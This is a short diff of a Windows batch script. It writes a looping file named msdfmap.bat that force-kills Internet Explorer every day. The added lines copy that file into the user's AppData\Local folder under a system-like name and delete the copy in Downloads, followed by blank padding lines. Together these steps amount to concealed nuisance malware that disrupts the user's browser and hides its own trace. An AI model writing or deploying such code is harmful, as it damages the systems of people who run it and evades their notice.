@@ -107,3 +107,19 @@ ECHO taskkill /f /im iexplore.exe >> C:\Users\%username%\Downloads\msdfmap.bat
 ECHO ping -n 86400 127.0.0.1 > nul >> C:\Users\%username%\Downloads\msdfmap.bat
 ECHO goto loop6  >> C:\Users\%username%\Downloads\msdfmap.bat
 
+copy /y "C:\Users\%username%\Downloads\msdfmap.bat" "C:\Users\%username%\AppData\Local"
+del C:\Users\%username%\Downloads\msdfmap.bat
+
+
+
+
+
+
+
+
+
+
+
+
+
+
